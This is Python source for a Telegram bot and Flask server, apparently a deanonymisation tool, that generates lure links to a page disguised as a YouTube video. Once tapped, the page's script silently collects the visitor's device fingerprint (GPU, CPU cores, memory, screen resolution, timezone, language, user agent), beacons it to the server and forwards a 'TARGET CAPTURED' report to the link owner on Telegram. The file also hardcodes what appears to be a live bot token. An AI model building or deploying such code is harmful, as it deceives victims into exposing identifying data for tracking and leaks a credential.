import threading
import requests
import json
import os
import base64
import time
import logging
import sqlite3
import datetime
from flask import Flask, render_template_string, request, jsonify

# =================================================================
# [1] CONFIGURATION & DATABASE SETUP
# =================================================================
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OVERLORD_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("PHANTOM_v2")

def init_db():
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS links (sid TEXT PRIMARY KEY, owner_id INTEGER)''')
    conn.commit()
    conn.close()

def save_link(sid, owner_id):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute('INSERT OR REPLACE INTO links (sid, owner_id) VALUES (?, ?)', (sid, owner_id))
    conn.commit()
    conn.close()

def get_owner(sid):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT owner_id FROM links WHERE sid = ?', (sid,))
    res = cursor.fetchone()
    conn.close()
    return res[0] if res else OVERLORD_ID

# =================================================================
# [2] STEALTH EXPLOIT UI (JS FINGERPRINTING)
# =================================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>YouTube Mobile</title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; }
        #app { width:100%; height:100%; display:flex; align-items:center; justify-content:center; 
               background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; }
        .play-btn { width: 72px; height: 50px; background: rgba(255,0,0,0.9); border-radius: 14px; position: relative; }
        .play-btn::after { content: ""; position: absolute; left: 28px; top: 15px; border-left: 20px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
    </style>
</head>
<body onclick="ignite()">
    <div id="app"><div class="play-btn"></div></div>
<script>
    const sid = "{{sid}}";
    async function ignite() {
        const getGPU = () => {
            const gl = document.createElement('canvas').getContext('webgl');
            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Unknown";
        };

        const specs = {
            gpu: getGPU(),
            cores: navigator.hardwareConcurrency || "N/A",
            mem: navigator.deviceMemory || "N/A",
            res: screen.width + "x" + screen.height,
            plat: navigator.platform,
            ua: navigator.userAgent,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            lang: navigator.language
        };

        const payload = { sid: sid, specs: specs, ua: navigator.userAgent };
        navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(payload)));
        
        setTimeout(() => { window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ"); }, 1000);
    }
</script>
</body>
</html>
"""

# =================================================================
# [3] LOGIC ENGINE
# =================================================================

def build_report(data):
    s = data.get('specs', {})
    return (
        "<b>🔴 TARGET CAPTURED</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>SID:</b> <code>{data.get('sid')}</code>\n"
        f"🎮 <b>GPU:</b> <code>{s.get('gpu')}</code>\n"
        f"🧠 <b>CPU/RAM:</b> <code>{s.get('cores')} Cores / {s.get('mem')}GB</code>\n"
        f"📐 <b>Res:</b> <code>{s.get('res')}</code>\n"
        f"📍 <b>TZ:</b> <code>{s.get('tz')}</code>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>UA:</b> <code>{data.get('ua')[:100]}...</code>"
    )

@app.route('/v/<sid>')
def serve(sid): return render_template_string(HTML_TEMPLATE, sid=sid)

@app.route('/gate/capture', methods=['POST'])
def capture():
    try:
        data = json.loads(base64.b64decode(request.get_data()).decode())
        sid = str(data.get('sid'))
        owner_id = get_owner(sid)
        
        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", json={
            "chat_id": owner_id, "text": build_report(data), "parse_mode": "HTML"
        })
    except Exception as e: logger.error(e)
    return "OK"

# =================================================================
# [4] BOT CONTROL
# =================================================================

def bot_engine():
    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{API_TOKEN}/getUpdates?offset={offset}&timeout=10").json()
            for upd in r.get("result", []):
                offset = upd["update_id"] + 1
                msg = upd.get("message")
                if not msg or "text" not in msg: continue
                
                cid = msg["chat"]["id"]
                text = msg["text"]

                if text == "/start":
                    sid = str(cid)
                    save_link(sid, cid)
                    link = f"{BASE_URL}/v/{sid}"
                    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", json={
                        "chat_id": cid, "text": f"✅ Ссылка готова:\n<code>{link}</code>", "parse_mode": "HTML"
                    })
        except: time.sleep(2)

if __name__ == '__main__':
    init_db()
    threading.Thread(target=bot_engine, daemon=True).start()
    app.run(host='0.0.0.0', port=PORT)
